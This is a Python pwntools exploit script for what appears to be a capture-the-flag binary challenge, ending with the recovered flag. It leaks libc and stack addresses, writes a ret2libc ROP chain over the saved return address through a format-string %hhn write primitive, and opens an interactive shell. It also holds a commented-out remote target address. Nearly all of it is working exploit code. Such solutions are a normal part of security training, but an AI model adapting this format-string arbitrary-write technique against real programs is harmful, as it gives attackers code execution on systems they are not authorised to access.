from pwn import *
context.binary = "./chall_patched"
script="""
b*vuln+120
b*main+158
"""
p = process()
#p = remote("34.70.212.151",8002)
#gdb.attach(p,script)
def choice(choose: bytes):
    p.sendlineafter(b'>>', choose)

def write_1_byte(addr: int, data: int):
    payload = b''
    if data==0:
        payload = f'%8$hhn'.encode().ljust(16,b'.')
    else:
        payload = f'%{data}c%8$hhn'.encode().ljust(16,b'.')
    payload += p64(addr)
    choice(b'2')
    p.recv()
    p.sendline(payload)

def write_8_bytes(addr: int, data: int):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
    ]
    for i in range(0,len(to_write)):
        write_1_byte(addr+i,to_write[i])


choice(b'1')
p.recvuntil(b'Have this: ')

leak_fgets = int(p.recvline().strip(b'\n'),base=16)
# leak_system = leak_fgets-0x2e610
# libc_base = leak_fgets - 0x7f380
# leak_rip = leak_stack+0x38
# pop_rdi = libc_base + 0x000000000002a3e5
# ret = pop_rdi + 1
# bin_sh = libc_base +  0x1d8678
log.info("Leak fgets: %s",hex(leak_fgets))
choice(b'2')
p.recv()
p.sendline(b'%12$llo')
#gdb.attach(p)
print(p.recvuntil(b'Input\n>> '))

leak_stack = int(p.recvline().strip(b'\n'),base=8)
#u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))
log.info("Leak stack: %s",hex(leak_stack))
leak_rip = leak_stack + 0x8
log.info("Leak rip: %s",hex(leak_rip))
libc_base = leak_fgets - 0x81600
pop_rdi = libc_base + 0x28715
ret = pop_rdi + 1
bin_sh =libc_base + 0x1c041b
leak_system = libc_base + 0x55230
write_8_bytes(leak_rip,ret)
#gdb.attach(p)
time.sleep(0.2)
write_8_bytes(leak_rip+8,pop_rdi)
time.sleep(0.2)
write_8_bytes(leak_rip+16,bin_sh)
time.sleep(0.2)
write_8_bytes(leak_rip+24,leak_system)
time.sleep(0.2)
choice(b'4')

p.interactive()
# Flag: flag{Wr17in6_p1t_w17h_f0rm47_5tr1ng_1s_fun}
